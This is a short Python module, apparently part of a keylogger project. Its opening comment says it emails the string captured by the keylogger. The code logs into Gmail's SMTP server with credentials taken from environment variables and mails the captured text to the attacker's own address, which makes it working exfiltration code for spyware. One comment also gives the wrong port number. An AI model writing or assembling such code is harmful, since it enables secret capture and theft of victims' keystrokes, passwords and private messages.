# Handles sending the string you pass from the keylogger via email
import os
import smtplib # Need import for sending emails using SMTP
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Retrieves email address and app password from .env file
sender = os.getenv("EMAIL")
reciever = sender
APP_PASSWORD = os.getenv("APP_PASSWORD")

def send_email(subject, email_body):
    # Creates multipart email message
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = reciever
    msg['Subject'] = subject
    #Attaches the email as plain text
    msg.attach(MIMEText(email_body, 'plain'))

    try:
        # Port 456 (or can use 587) to connect to Gmail's SMTP server using SSL
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender, APP_PASSWORD)
            server.sendmail(sender, reciever, msg.as_string())
        print("email sent successfully!")
    except:
        print("Error, email was not sent")